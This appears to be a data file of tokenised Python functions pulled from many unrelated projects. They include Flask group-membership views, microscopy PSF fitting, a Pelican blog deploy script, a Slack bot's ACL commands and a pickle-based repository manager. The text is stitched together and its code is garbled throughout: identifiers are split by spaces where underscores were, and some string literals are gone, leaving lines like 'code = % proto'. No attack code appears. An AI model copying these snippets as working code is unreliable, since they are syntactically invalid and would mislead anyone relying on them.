def index ( ) : page = request . args . get ( 'page' , 1 , type = int ) per page = request . args . get ( 'per page' , 5 , type = int ) q = request . args . get ( 'q' , '' ) groups = Group . query by user ( current user , eager = True ) if q : groups = Group . search ( groups , q ) groups = groups . paginate ( page , per page = per page ) requests = Membership . query requests ( current user ) . count ( ) invitations = Membership . query invitations ( current user ) . count ( ) return render template ( 'invenio groups/index.html' , groups = groups , requests = requests , invitations = invitations , page = page , per page = per page , q = q )
def requests ( ) : page = request . args . get ( 'page' , 1 , type = int ) per page = request . args . get ( 'per page' , 5 , type = int ) memberships = Membership . query requests ( current user , eager = True ) . all ( ) return render template ( 'invenio groups/pending.html' , memberships = memberships , requests = True , page = page , per page = per page , )
def invitations ( ) : page = request . args . get ( 'page' , 1 , type = int ) per page = request . args . get ( 'per page' , 5 , type = int ) memberships = Membership . query invitations ( current user , eager = True ) . all ( ) return render template ( 'invenio groups/pending.html' , memberships = memberships , page = page , per page = per page , )
def new ( ) : form = Group Form ( request . form ) if form . validate on submit ( ) : try : group = Group . create ( admins = [ current user ] , * * form . data ) flash ( ( 'Group "%(name)s" created' , name = group . name ) , 'success' ) return redirect ( url for ( ".index" ) ) except Integrity Error : flash ( ( 'Group creation failure' ) , 'error' ) return render template ( "invenio groups/new.html" , form = form , )
def manage ( group id ) : group = Group . query . get or 404 ( group id ) form = Group Form ( request . form , obj = group ) if form . validate on submit ( ) : if group . can edit ( current user ) : try : group . update ( * * form . data ) flash ( ( 'Group "%(name)s" was updated' , name = group . name ) , 'success' ) except Exception as e : flash ( str ( e ) , 'error' ) return render template ( "invenio groups/new.html" , form = form , group = group , ) else : flash ( ( 'You cannot edit group %(group name)s' , group name = group . name ) , 'error' ) return render template ( "invenio groups/new.html" , form = form , group = group , )
def members ( group id ) : page = request . args . get ( 'page' , 1 , type = int ) per page = request . args . get ( 'per page' , 5 , type = int ) q = request . args . get ( 'q' , '' ) s = request . args . get ( 's' , '' ) group = Group . query . get or 404 ( group id ) if group . can see members ( current user ) : members = Membership . query by group ( group id , with invitations = True ) if q : members = Membership . search ( members , q ) if s : members = Membership . order ( members , Membership . state , s ) members = members . paginate ( page , per page = per page ) return render template ( "invenio groups/members.html" , group = group , members = members , page = page , per page = per page , q = q , s = s , ) flash ( ( 'You are not allowed to see members of this group %(group name)s.' , group name = group . name ) , 'error' ) return redirect ( url for ( '.index' ) )
def approve ( group id , user id ) : membership = Membership . query . get or 404 ( ( user id , group id ) ) group = membership . group if group . can edit ( current user ) : try : membership . accept ( ) except Exception as e : flash ( str ( e ) , 'error' ) return redirect ( url for ( '.requests' , group id = membership . group . id ) ) flash ( ( '%(user)s accepted to %(name)s group.' , user = membership . user . email , name = membership . group . name ) , 'success' ) return redirect ( url for ( '.requests' , group id = membership . group . id ) ) flash ( ( 'You cannot approve memberships for the group %(group name)s' , group name = group . name ) , 'error' ) return redirect ( url for ( '.index' ) )
def remove ( group id , user id ) : group = Group . query . get or 404 ( group id ) user = User . query . get or 404 ( user id ) if group . can edit ( current user ) : try : group . remove member ( user ) except Exception as e : flash ( str ( e ) , "error" ) return redirect ( urlparse ( request . referrer ) . path ) flash ( ( 'User %(user email)s was removed from %(group name)s group.' , user email = user . email , group name = group . name ) , 'success' ) return redirect ( urlparse ( request . referrer ) . path ) flash ( ( 'You cannot delete users of the group %(group name)s' , group name = group . name ) , 'error' ) return redirect ( url for ( '.index' ) )
def accept ( group id ) : membership = Membership . query . get or 404 ( ( current user . get id ( ) , group id ) ) # no permission check, because they are checked during Memberships creating try : membership . accept ( ) except Exception as e : flash ( str ( e ) , 'error' ) return redirect ( url for ( '.invitations' , group id = membership . group . id ) ) flash ( ( 'You are now part of %(name)s group.' , user = membership . user . email , name = membership . group . name ) , 'success' ) return redirect ( url for ( '.invitations' , group id = membership . group . id ) )
def translate particles ( s , max mem = 1e9 , desc = '' , min rad = 'calc' , max rad = 'calc' , invert = 'guess' , rz order = 0 , do polish = True ) : if desc is not None : desc trans = desc + 'translate-particles' desc burn = desc + 'addsub burn' desc polish = desc + 'addsub polish' else : desc trans , desc burn , desc polish = [ None ] * 3 RLOG . info ( 'Translate Particles:' ) opt . burn ( s , mode = 'do-particles' , n loop = 4 , fractol = 0.1 , desc = desc trans , max mem = max mem , include rad = False , dowarn = False ) opt . burn ( s , mode = 'do-particles' , n loop = 4 , fractol = 0.05 , desc = desc trans , max mem = max mem , include rad = True , dowarn = False ) RLOG . info ( 'Start add-subtract' ) addsub . add subtract ( s , tries = 30 , min rad = min rad , max rad = max rad , invert = invert ) if desc is not None : states . save ( s , desc = desc + 'translate-addsub' ) if do polish : RLOG . info ( 'Final Burn:' ) opt . burn ( s , mode = 'burn' , n loop = 3 , fractol = 3e-4 , desc = desc burn , max mem = max mem , rz order = rz order , dowarn = False ) RLOG . info ( 'Final Polish:' ) d = opt . burn ( s , mode = 'polish' , n loop = 4 , fractol = 3e-4 , desc = desc polish , max mem = max mem , rz order = rz order , dowarn = False ) if not d [ 'converged' ] : RLOG . warn ( 'Optimization did not converge; consider re-running' )
def link zscale ( st ) : # FIXME should be made more generic to other parameters and categories psf = st . get ( 'psf' ) psf . param dict [ 'zscale' ] = psf . param dict [ 'psf-zscale' ] psf . params [ psf . params . index ( 'psf-zscale' ) ] = 'zscale' psf . global zscale = True psf . param dict . pop ( 'psf-zscale' ) st . trigger parameter change ( ) st . reset ( )
def check for inception ( self , root dict ) : for key in root dict : if isinstance ( root dict [ key ] , dict ) : root dict [ key ] = Response Object ( root dict [ key ] ) return root dict
def barnes ( self , pos ) : b in = self . b in dist = lambda x : np . sqrt ( np . dot ( x , x ) ) #we take a filter size as the max distance between the grids along #x or y: sz = self . npts [ 1 ] coeffs = self . get values ( self . barnes params ) b = Barnes Interpolation ND ( b in , coeffs , filter size = self . filtsize , damp = 0.9 , iterations = 3 , clip = self . local updates , clipsize = self . barnes clip size , blocksize = 100 # FIXME magic blocksize ) return b ( pos )
def schedules ( self , schedules ) : url = PATHS [ 'UPDATE SCHEDULES' ] % self . id data format = "schedules[0][%s][]=%s&" post data = "" for format type , values in schedules . iteritems ( ) : for value in values : post data += data format % ( format type , value ) self . api . post ( url = url , data = post data )
def moment ( p , v , order = 1 ) : if order == 1 : return ( v * p ) . sum ( ) elif order == 2 : return np . sqrt ( ( ( v ** 2 ) * p ) . sum ( ) - ( v * p ) . sum ( ) ** 2 )
def tz ( self , z ) : return ( z - self . param dict [ 'psf-zslab' ] ) * self . param dict [ self . zscale ]
def characterize psf ( self ) : # there may be an issue with the support and characterization-- # it might be best to do the characterization with the same support # as the calculated psf. l , u = max ( self . zrange [ 0 ] , self . param dict [ 'psf-zslab' ] ) , self . zrange [ 1 ] size l , drift l = self . measure size drift ( l ) size u , drift u = self . measure size drift ( u ) # must be odd for now or have a better system for getting the center self . support = util . oddify ( 2 * self . support factor * size u . astype ( 'int' ) ) self . drift poly = np . polyfit ( [ l , u ] , [ drift l , drift u ] , 1 ) if self . cutoffval is not None : psf , vec , size l = self . psf slice ( l , size = 51 , zoffset = drift l , getextent = True ) psf , vec , size u = self . psf slice ( u , size = 51 , zoffset = drift u , getextent = True ) ss = [ np . abs ( i ) . sum ( axis = - 1 ) for i in [ size l , size u ] ] self . support = util . oddify ( util . amax ( * ss ) )
def psffunc ( self , * args , * * kwargs ) : if self . polychromatic : func = psfcalc . calculate polychrome linescan psf else : func = psfcalc . calculate linescan psf return func ( * args , * * kwargs )
def psffunc ( self , x , y , z , * * kwargs ) : #do pinhole?? FIXME if self . polychromatic : func = psfcalc . calculate polychrome pinhole psf else : func = psfcalc . calculate pinhole psf x0 , y0 = [ psfcalc . vec to halfvec ( v ) for v in [ x , y ] ] vls = psfcalc . wrap and calc psf ( x0 , y0 , z , func , * * kwargs ) return vls / vls . sum ( )
def characterize psf ( self ) : l , u = max ( self . zrange [ 0 ] , self . param dict [ 'psf-zslab' ] ) , self . zrange [ 1 ] size l , drift l = self . measure size drift ( l , size = self . support ) size u , drift u = self . measure size drift ( u , size = self . support ) self . drift poly = np . polyfit ( [ l , u ] , [ drift l , drift u ] , 1 )
def req ( self , url , method = 'GET' , * * kw ) : send = requests . post if method == 'POST' else requests . get try : r = send ( url , headers = self . token header ( ) , timeout = self . settings [ 'timeout' ] , * * kw ) except requests . exceptions . Timeout : raise Api Error ( 'Request timed out (%s seconds)' % self . settings [ 'timeout' ] ) try : json = r . json ( ) except Value Error : raise Api Error ( 'Received not JSON response from API' ) if json . get ( 'status' ) != 'ok' : raise Api Error ( 'API error: received unexpected json from API: %s' % json ) return json
def get active bets ( self , project id = None ) : url = urljoin ( self . settings [ 'bets url' ] , 'bets?state=fresh,active,accept end&page=1&page size=100' ) if project id is not None : url += '&kava project id={}' . format ( project id ) bets = [ ] has next page = True while has next page : res = self . req ( url ) bets . extend ( res [ 'bets' ] [ 'results' ] ) url = res [ 'bets' ] . get ( 'next' ) has next page = bool ( url ) return bets
def subscribe ( self , event , bet ids ) : if not self . subscriptions . get ( event ) : self . subscriptions [ event ] = set ( ) self . subscriptions [ event ] = self . subscriptions [ event ] . union ( bet ids )
def preview ( context ) : config = context . obj pelican ( config , '--verbose' , '--ignore-cache' ) server proc = None os . chdir ( config [ 'OUTPUT DIR' ] ) try : try : command = 'python -m http.server ' + str ( PORT ) server proc = run ( command , bg = True ) time . sleep ( 3 ) click . launch ( 'http://localhost:8000' ) time . sleep ( 5 ) pelican ( config , '--autoreload' ) except Exception : if server proc is not None : server proc . kill ( ) raise except Keyboard Interrupt : abort ( context )
def write ( context ) : config = context . obj title = click . prompt ( 'Title' ) author = click . prompt ( 'Author' , default = config . get ( 'DEFAULT AUTHOR' ) ) slug = slugify ( title ) creation date = datetime . now ( ) basename = '{:%Y-%m-%d} {}.md' . format ( creation date , slug ) meta = ( ( 'Title' , title ) , ( 'Date' , '{:%Y-%m-%d %H:%M}:00' . format ( creation date ) ) , ( 'Modified' , '{:%Y-%m-%d %H:%M}:00' . format ( creation date ) ) , ( 'Author' , author ) , ) file content = '' for key , value in meta : file content += '{}: {}\n' . format ( key , value ) file content += '\n\n' file content += 'Text...\n\n' file content += '![image description]({filename}/images/my-photo.jpg)\n\n' file content += 'Text...\n\n' os . makedirs ( config [ 'CONTENT DIR' ] , exist ok = True ) path = os . path . join ( config [ 'CONTENT DIR' ] , basename ) with click . open file ( path , 'w' ) as f : f . write ( file content ) click . echo ( path ) click . launch ( path )
def lint ( context ) : config = context . obj try : run ( 'flake8 {dir} --exclude={exclude}' . format ( dir = config [ 'CWD' ] , exclude = ',' . join ( EXCLUDE ) , ) ) except Subprocess Error : context . exit ( 1 )
def publish ( context ) : header ( 'Recording changes...' ) run ( 'git add -A' ) header ( 'Displaying changes...' ) run ( 'git -c color.status=always status' ) if not click . confirm ( '\n Continue publishing' ) : run ( 'git reset HEAD --' ) abort ( context ) header ( 'Saving changes...' ) try : run ( 'git commit -m "{message}"' . format ( message = 'Publishing {}' . format ( choose commit emoji ( ) ) ) , capture = True ) except subprocess . Called Process Error as e : if 'nothing to commit' not in e . stdout : raise else : click . echo ( 'Nothing to commit.' ) header ( 'Pushing to Git Hub...' ) branch = get branch ( ) run ( 'git push origin {branch}:{branch}' . format ( branch = branch ) ) pr link = get pr link ( branch ) if pr link : click . launch ( pr link )
def deploy ( context ) : config = context . obj header ( 'Generating HTML...' ) pelican ( config , '--verbose' , production = True ) header ( 'Removing unnecessary output...' ) unnecessary paths = [ 'author' , 'category' , 'tag' , 'feeds' , 'tags.html' , 'authors.html' , 'categories.html' , 'archives.html' , ] for path in unnecessary paths : remove path ( os . path . join ( config [ 'OUTPUT DIR' ] , path ) ) if os . environ . get ( 'TRAVIS' ) : # Travis CI header ( 'Setting up Git...' ) run ( 'git config user.name ' + run ( 'git show --format="%c N" -s' , capture = True ) ) run ( 'git config user.email ' + run ( 'git show --format="%c E" -s' , capture = True ) ) github token = os . environ . get ( 'GITHUB TOKEN' ) repo slug = os . environ . get ( 'TRAVIS REPO SLUG' ) origin = 'https://{}@github.com/{}.git' . format ( github token , repo slug ) run ( 'git remote set-url origin ' + origin ) header ( 'Rewriting gh-pages branch...' ) run ( 'ghp-import -m "{message}" {dir}' . format ( message = 'Deploying {}' . format ( choose commit emoji ( ) ) , dir = config [ 'OUTPUT DIR' ] , ) ) header ( 'Pushing to Git Hub...' ) run ( 'git push origin gh-pages:gh-pages --force' )
def signed number ( number , precision = 2 ) : prefix = '' if number <= 0 else '+' number str = '{}{:.{precision}f}' . format ( prefix , number , precision = precision ) return number str
def show response messages ( response json ) : message type kwargs = { 'warning' : { 'fg' : 'yellow' } , 'error' : { 'fg' : 'red' } , } for message in response json . get ( 'messages' , [ ] ) : click . secho ( message [ 'text' ] , * * message type kwargs . get ( message [ 'type' ] , { } ) )
def photos ( context , path ) : config = context . obj header ( 'Looking for the latest article...' ) article filename = find last article ( config [ 'CONTENT DIR' ] ) if not article filename : return click . secho ( 'No articles.' , fg = 'red' ) click . echo ( os . path . basename ( article filename ) ) header ( 'Looking for images...' ) images = list ( sorted ( find images ( path ) ) ) if not images : return click . secho ( 'Found no images.' , fg = 'red' ) for filename in images : click . secho ( filename , fg = 'green' ) if not click . confirm ( '\n Add these images to the latest article' ) : abort ( config ) url prefix = os . path . join ( '{filename}' , IMAGES PATH ) images dir = os . path . join ( config [ 'CONTENT DIR' ] , IMAGES PATH ) os . makedirs ( images dir , exist ok = True ) header ( 'Processing images...' ) urls = [ ] for filename in images : image basename = os . path . basename ( filename ) . replace ( ' ' , '-' ) . lower ( ) urls . append ( os . path . join ( url prefix , image basename ) ) image filename = os . path . join ( images dir , image basename ) print ( filename , image filename ) import image ( filename , image filename ) content = '\n' for url in urls : url = url . replace ( '\\' , '/' ) content += '\n![image description]({})\n' . format ( url ) header ( 'Adding to article: {}' . format ( article filename ) ) with click . open file ( article filename , 'a' ) as f : f . write ( content ) click . launch ( article filename )
def generate circle ( self ) : total weight = 0 for node in self . nodes : total weight += self . weights . get ( node , 1 ) for node in self . nodes : weight = 1 if node in self . weights : weight = self . weights . get ( node ) factor = math . floor ( ( 40 * len ( self . nodes ) * weight ) / total weight ) for j in range ( 0 , int ( factor ) ) : b key = bytearray ( self . hash digest ( '%s-%s' % ( node , j ) ) ) for i in range ( 0 , 3 ) : key = self . hash val ( b key , lambda x : x + i * 4 ) self . ring [ key ] = node self . sorted keys . append ( key ) self . sorted keys . sort ( )
def get networking mode ( app ) : # Marathon 1.5+: there is a `networks` field networks = app . get ( 'networks' ) if networks : # Modes cannot be mixed, so assigning the last mode is fine return networks [ - 1 ] . get ( 'mode' , 'container' ) # Older Marathon: determine equivalent network mode container = app . get ( 'container' ) if container is not None and 'docker' in container : docker network = container [ 'docker' ] . get ( 'network' ) if docker network == 'USER' : return 'container' elif docker network == 'BRIDGE' : return 'container/bridge' return 'container' if is legacy ip per task ( app ) else 'host'
def get container port mappings ( app ) : container = app [ 'container' ] # Marathon 1.5+: container.port Mappings field port mappings = container . get ( 'port Mappings' ) # Older Marathon: container.docker.port Mappings field if port mappings is None and 'docker' in container : port mappings = container [ 'docker' ] . get ( 'port Mappings' ) return port mappings
def request ( self , failure , endpoints , * args , * * kwargs ) : # We've run out of endpoints, fail if not endpoints : return failure endpoint = endpoints . pop ( 0 ) d = super ( Marathon Client , self ) . request ( * args , url = endpoint , * * kwargs ) # If something goes wrong, call ourselves again with the remaining # endpoints d . add Errback ( self . request , endpoints , * args , * * kwargs ) return d
def read ( self , path , * * params ) : d = self . request ( 'GET' , '/v1/' + path , params = params ) return d . add Callback ( self . handle response )
def write ( self , path , * * data ) : d = self . request ( 'PUT' , '/v1/' + path , json = data ) return d . add Callback ( self . handle response , check cas = True )
def parse field value ( line ) : if line . startswith ( ':' ) : # Ignore the line return None , None if ':' not in line : # Treat the entire line as the field, use empty string as value return line , '' # Else field is before the ':' and value is after field , value = line . split ( ':' , 1 ) # If value starts with a space, remove it. value = value [ 1 : ] if value . startswith ( ' ' ) else value return field , value
def handle field value ( self , field , value ) : if field == 'event' : self . event = value elif field == 'data' : self . data lines . append ( value ) elif field == 'id' : # Not implemented pass elif field == 'retry' : # Not implemented pass
def dispatch event ( self ) : data = self . prepare data ( ) if data is not None : self . handler ( self . event , data ) self . reset event data ( )
def issue cert ( self , domain ) : def errback ( failure ) : # Don't fail on some of the errors we could get from the ACME # server, rather just log an error so that we can continue with # other domains. failure . trap ( txacme Server Error ) acme error = failure . value . message if acme error . code in [ 'rate Limited' , 'server Internal' , 'connection' , 'unknown Host' ] : # TODO: Fire off an error to Sentry or something? self . log . error ( 'Error ({code}) issuing certificate for "{domain}": ' '{detail}' , code = acme error . code , domain = domain , detail = acme error . detail ) else : # There are more error codes but if they happen then something # serious has gone wrong-- carry on error-ing. return failure d = self . txacme service . issue cert ( domain ) return d . add Errback ( errback )
def start ( self ) : self . bot start time = datetime . now ( ) self . webserver = Webserver ( self . config [ 'webserver' ] [ 'host' ] , self . config [ 'webserver' ] [ 'port' ] ) self . plugins . load ( ) self . plugins . load state ( ) self . find event handlers ( ) self . sc = Threaded Slack Client ( self . config [ 'slack token' ] ) self . always send dm = [ ' unauthorized ' ] if 'always send dm' in self . config : self . always send dm . extend ( map ( lambda x : '!' + x , self . config [ 'always send dm' ] ) ) # Rocket is very noisy at debug logging . get Logger ( 'Rocket.Errors.Thread Pool' ) . set Level ( logging . INFO ) self . is setup = True if self . test mode : self . metrics [ 'startup time' ] = ( datetime . now ( ) - self . bot start time ) . total seconds ( ) * 1000.0
def stop ( self ) : if self . webserver is not None : self . webserver . stop ( ) if not self . test mode : self . plugins . save state ( )
def push ( self , message ) : if self . ignore event ( message ) : return None , None args = self . parse message ( message ) self . log . debug ( "Searching for command using chunks: %s" , args ) cmd , msg args = self . find longest prefix command ( args ) if cmd is not None : if message . user is None : self . log . debug ( "Discarded message with no originating user: %s" , message ) return None , None sender = message . user . username if message . channel is not None : sender = "#%s/%s" % ( message . channel . name , sender ) self . log . info ( "Received from %s: %s, args %s" , sender , cmd , msg args ) f = self . get command ( cmd , message . user ) if f : if self . is channel ignored ( f , message . channel ) : self . log . info ( "Channel %s is ignored, discarding command %s" , message . channel , cmd ) return ' ignored ' , "" return cmd , f . execute ( message , msg args ) return ' unauthorized ' , "Sorry, you are not authorized to run %s" % cmd return None , None
def acl show ( self , msg , args ) : name = args [ 0 ] if len ( args ) > 0 else None if name is None : return "%s: The following AC Ls are defined: %s" % ( msg . user , ', ' . join ( self . acl . keys ( ) ) ) if name not in self . acl : return "Sorry, couldn't find an acl named '%s'" % name return '\n' . join ( [ "%s: ACL '%s' is defined as follows:" % ( msg . user , name ) , "allow: %s" % ', ' . join ( self . acl [ name ] [ 'allow' ] ) , "deny: %s" % ', ' . join ( self . acl [ name ] [ 'deny' ] ) ] )
def add user to allow ( self , name , user ) : # Clear user from both allow and deny before adding if not self . remove user from acl ( name , user ) : return False if name not in self . acl : return False self . acl [ name ] [ 'allow' ] . append ( user ) return True
def create acl ( self , name ) : if name in self . acl : return False self . acl [ name ] = { 'allow' : [ ] , 'deny' : [ ] } return True
def delete acl ( self , name ) : if name not in self . acl : return False del self . acl [ name ] return True
def mongo ( daemon = False , port = 20771 ) : cmd = "mongod --port {0}" . format ( port ) if daemon : cmd += " --fork" run ( cmd )
def get by username ( self , username ) : res = filter ( lambda x : x . username == username , self . users . values ( ) ) if len ( res ) > 0 : return res [ 0 ] return None
def load user rights ( self , user ) : if user . username in self . admins : user . is admin = True elif not hasattr ( user , 'is admin' ) : user . is admin = False
def freeze ( value ) : if isinstance ( value , list ) : return Frozen List ( * value ) if isinstance ( value , dict ) : return Frozen Dict ( * * value ) return value
def help ( self , msg , args ) : output = [ ] if len ( args ) == 0 : commands = sorted ( self . bot . dispatcher . commands . items ( ) , key = itemgetter ( 0 ) ) commands = filter ( lambda x : x [ 1 ] . is subcmd is False , commands ) # Filter commands if auth is enabled, hide admin commands is enabled, and user is not admin if self . should filter help commands ( msg . user ) : commands = filter ( lambda x : x [ 1 ] . admin only is False , commands ) for name , cmd in commands : output . append ( self . get short help for command ( name ) ) else : name = '!' + args [ 0 ] output = [ self . get help for command ( name ) ] return '\n' . join ( output )
def save ( self , msg , args ) : self . send message ( msg . channel , "Saving current state..." ) self . bot . plugins . save state ( ) self . send message ( msg . channel , "Done." )
def shutdown ( self , msg , args ) : self . log . info ( "Received shutdown from %s" , msg . user . username ) self . bot . runnable = False return "Shutting down..."
def whoami ( self , msg , args ) : output = [ "Hello %s" % msg . user ] if hasattr ( self . bot . dispatcher , 'auth manager' ) and msg . user . is admin is True : output . append ( "You are a *bot admin*." ) output . append ( "Bot version: %s-%s" % ( self . bot . version , self . bot . commit ) ) return '\n' . join ( output )
def arg name ( self , name , types , prefix = "--" ) : if 'type:a10 nullable' in types : return self . arg name ( name , types [ 'type:a10 nullable' ] , prefix ) if 'type:a10 list' in types : return self . arg name ( name , types [ 'type:a10 list' ] , prefix ) if 'type:a10 reference' in types : if name . endswith ( ' id' ) : name = name [ : - 3 ] return prefix + name . replace ( ' ' , '-' )
def sort by ( key ) : @ staticmethod def sort by ( p list , reverse = False ) : return sorted ( p list , key = lambda p : getattr ( p , key ) , reverse = reverse , ) return sort by
def n file ( self ) : self . assert is dir and exists ( ) n = 0 for in self . select file ( recursive = True ) : n += 1 return n
def n dir ( self ) : self . assert is dir and exists ( ) n = 0 for in self . select dir ( recursive = True ) : n += 1 return n
def acquire lock ( func ) : @ wraps ( func ) def wrapper ( self , * args , * * kwargs ) : with self . locker as r : # get the result acquired , code , = r if acquired : try : r = func ( self , * args , * * kwargs ) except Exception as err : e = str ( err ) else : e = None else : warnings . warn ( "code %s. Unable to aquire the lock when calling '%s'. You may try again!" % ( code , func . name ) ) e = None r = None # raise error after exiting with statement and releasing the lock! if e is not None : traceback . print stack ( ) raise Exception ( e ) return r return wrapper
def sync required ( func ) : @ wraps ( func ) def wrapper ( self , * args , * * kwargs ) : if not self . keep Synchronized : r = func ( self , * args , * * kwargs ) else : state = self . load state ( ) #print("----------->  ",state, self.state) if state is None : r = func ( self , * args , * * kwargs ) elif state == self . state : r = func ( self , * args , * * kwargs ) else : warnings . warn ( "Repository at '%s' is out of date. Need to load it again to avoid conflict." % self . path ) r = None return r return wrapper
def get pickling errors ( obj , seen = None ) : if seen == None : seen = [ ] if hasattr ( obj , " getstate " ) : state = obj . getstate ( ) #elif hasattr(obj, " dict "): #    state = obj. dict else : return None #try: #    state = obj. getstate () #except Attribute Error as e: #    #state = obj. dict #    return str(e) if state == None : return 'object state is None' if isinstance ( state , tuple ) : if not isinstance ( state [ 0 ] , dict ) : state = state [ 1 ] else : state = state [ 0 ] . update ( state [ 1 ] ) result = { } for i in state : try : pickle . dumps ( state [ i ] , protocol = 2 ) except pickle . Pickling Error as e : if not state [ i ] in seen : seen . append ( state [ i ] ) result [ i ] = get pickling errors ( state [ i ] , seen ) return result
def save ( self ) : # open file repo Info Path = os . path . join ( self . path , ".pyrepinfo" ) try : fdinfo = open ( repo Info Path , 'wb' ) except Exception as e : raise Exception ( "unable to open repository info for saving (%s)" % e ) # save repository try : pickle . dump ( self , fdinfo , protocol = 2 ) except Exception as e : fdinfo . flush ( ) os . fsync ( fdinfo . fileno ( ) ) fdinfo . close ( ) raise Exception ( "Unable to save repository info (%s)" % e ) finally : fdinfo . flush ( ) os . fsync ( fdinfo . fileno ( ) ) fdinfo . close ( ) # save timestamp repo Time Path = os . path . join ( self . path , ".pyrepstate" ) try : self . state = ( "%.6f" % time . time ( ) ) . encode ( ) with open ( repo Time Path , 'wb' ) as fdtime : fdtime . write ( self . state ) fdtime . flush ( ) os . fsync ( fdtime . fileno ( ) ) except Exception as e : raise Exception ( "unable to open repository time stamp for saving (%s)" % e )
def ensure str ( value ) : if isinstance ( value , six . string types ) : return value else : return six . text type ( value )
def stream ( self , report ) : with self . Client Session ( ) as session : lines = [ ] for job in report [ 'traces' ] : key = '%s:%s' % ( self . name , job ) for minute in report [ 'traces' ] [ job ] : for k , v in report [ 'traces' ] [ job ] [ minute ] . items ( ) : lines . append ( '# TYPE %s %s gauge' % ( key , k ) ) lines . append ( '%s %s %0.2f' % ( key , k , v ) ) # Empty is required at the end of the payload lines . append ( "" ) data = "\n" . join ( lines ) logger . info ( data ) yield from session . post ( self . url , data = bytes ( data . encode ( 'utf-8' ) ) )
def stream ( self , report ) : payload = { "agent" : { "host" : report [ 'instance' ] [ 'hostname' ] , "version" : "1.0.0" } , "components" : [ { "name" : self . name , "guid" : "com.darwinmonroy.aiometrics" , "duration" : 60 , "metrics" : { 'Component/{}' . format ( key ) : { "total" : metric [ 'count' ] * metric [ 'avg' ] , "count" : metric [ 'count' ] , "min" : metric [ 'min' ] , "max" : metric [ 'max' ] , "sum of squares" : metric [ 'min' ] ** 2 + metric [ 'max' ] ** 2 , } for key , metric in report [ 'traces' ] . items ( ) } } ] } with self . Client Session ( ) as session : try : r = yield from session . post ( 'https://platform-api.newrelic.com/platform/v1/metrics' , data = json . dumps ( payload ) , headers = ( ( 'X-License-Key' , self . license key ) , ( 'Content-Type' , 'application/json' ) , ( 'Accept' , 'application/json' ) , ) ) r . close ( ) except Exception as e : # Any exception should affect the execution of the main # program, so we must explicitly silence any error caused by # by the streaming of metrics # TODO: consider the implementation of a retry logic logger . exception ( e )
def stats ( cls , traces ) : data = { } stats = { } # Group traces by key and minute for trace in traces : key = trace [ 'key' ] if key not in data : data [ key ] = [ ] stats [ key ] = { } data [ key ] . append ( trace [ 'total time' ] ) cls . traces . pop ( trace [ 'id' ] ) for key in data : times = data [ key ] stats [ key ] = dict ( count = len ( times ) , max = max ( times ) , min = min ( times ) , avg = sum ( times ) / len ( times ) ) return stats
def stop ( self ) : with self . status lock : if self . running : assert self . observer is not None self . observer . stop ( ) self . running = False self . origin mapped data = dict ( )
def tear down ( self ) : while len ( self . temp directories ) > 0 : directory = self . temp directories . pop ( ) shutil . rmtree ( directory , ignore errors = True ) while len ( self . temp files ) > 0 : file = self . temp files . pop ( ) try : os . remove ( file ) except OS Error : pass
def copyto ( self , new abspath = None , new dirpath = None , new dirname = None , new basename = None , new fname = None , new ext = None , overwrite = False , makedirs = False ) : self . assert exists ( ) p = self . change ( new abspath = new abspath , new dirpath = new dirpath , new dirname = new dirname , new basename = new basename , new fname = new fname , new ext = new ext , ) if p . is not exist or allow overwrite ( overwrite = overwrite ) : # , copy if self . abspath != p . abspath : try : shutil . copy ( self . abspath , p . abspath ) except IO Error as e : if makedirs : os . makedirs ( p . parent . abspath ) shutil . copy ( self . abspath , p . abspath ) else : raise e return p
def get dump method ( dump , protocol = - 1 ) : if dump is None : dump = 'pickle' if dump . startswith ( 'pickle' ) : if dump == 'pickle' : proto = protocol else : proto = dump . strip ( 'pickle' ) try : proto = int ( proto ) assert proto >= - 1 except : raise Exception ( "protocol must be an integer >=-1" ) code = % proto elif dump . startswith ( 'dill' ) : if dump == 'dill' : proto = 2 else : proto = dump . strip ( 'dill' ) try : proto = int ( proto ) assert proto >= - 1 except : raise Exception ( "protocol must be an integer >=-1" ) code = % proto elif dump == 'json' : code = elif dump == 'numpy' : code = elif dump == 'numpy text' : code = else : assert isinstance ( dump , basestring ) , "dump must be None or a string" assert '$FILE PATH' in dump , "string dump code must inlcude '$FILE PATH'" code = dump # return return code
def get pull method ( pull ) : if pull is None or pull . startswith ( 'pickle' ) : code = elif pull . startswith ( 'dill' ) : code = elif pull == 'json' : code = elif pull == 'numpy' : code = elif pull == 'numpy text' : code = else : assert isinstance ( pull , basestring ) , "pull must be None or a string" assert 'PULLED DATA' in pull , "string pull code must inlcude 'PULLED DATA'" assert '$FILE PATH' in pull , "string pull code must inlcude '$FILE PATH'" code = pull # return return code
def path required ( func ) : @ wraps ( func ) def wrapper ( self , * args , * * kwargs ) : if self . path is None : warnings . warn ( 'Must load (Repository.load repository) or initialize (Repository.create repository) the repository first !' ) return return func ( self , * args , * * kwargs ) return wrapper
def clean before after ( self , state Before , state After , keep None Empty Directory = True ) : # prepare after for faster search errors = [ ] after Dict = { } [ after Dict . setdefault ( list ( aitem ) [ 0 ] , [ ] ) . append ( aitem ) for aitem in state After ] # loop before for bitem in reversed ( state Before ) : rela Path = list ( bitem ) [ 0 ] basename = os . path . basename ( rela Path ) btype = bitem [ rela Path ] [ 'type' ] alist = after Dict . get ( rela Path , [ ] ) aitem = [ a for a in alist if a [ rela Path ] [ 'type' ] == btype ] if len ( aitem ) > 1 : errors . append ( "Multiple '%s' of type '%s' where found in '%s', this should never had happened. Please report issue" % ( basename , btype , rela Path ) ) continue if not len ( aitem ) : remove Dirs = [ ] remove Files = [ ] if btype == 'dir' : if not len ( rela Path ) : errors . append ( "Removing main repository directory is not allowed" ) continue remove Dirs . append ( os . path . join ( self . path , rela Path ) ) remove Files . append ( os . path . join ( self . path , rela Path , self . dir Info ) ) remove Files . append ( os . path . join ( self . path , rela Path , self . dir Lock ) ) elif btype == 'file' : remove Files . append ( os . path . join ( self . path , rela Path ) ) remove Files . append ( os . path . join ( self . path , rela Path , self . file Info % basename ) ) remove Files . append ( os . path . join ( self . path , rela Path , self . file Lock % basename ) ) else : ### MUST VERIFY THAT ONCE pyrepobjectdir IS IMPLEMENTED remove Dirs . append ( os . path . join ( self . path , rela Path ) ) remove Files . append ( os . path . join ( self . path , rela Path , self . file Info % basename ) ) # remove files for fpath in remove Files : if os . path . isfile ( fpath ) : try : os . remove ( fpath ) except Exception as err : errors . append ( "Unable to clean file '%s' (%s)" % ( fpath , str ( err ) ) ) # remove directories for dpath in remove Dirs : if os . path . isdir ( dpath ) : if keep None Empty Directory or not len ( os . listdir ( dpath ) ) : try : shutil . rmtree ( dpath ) except Exception as err : errors . append ( "Unable to clean directory '%s' (%s)" % ( fpath , str ( err ) ) ) # 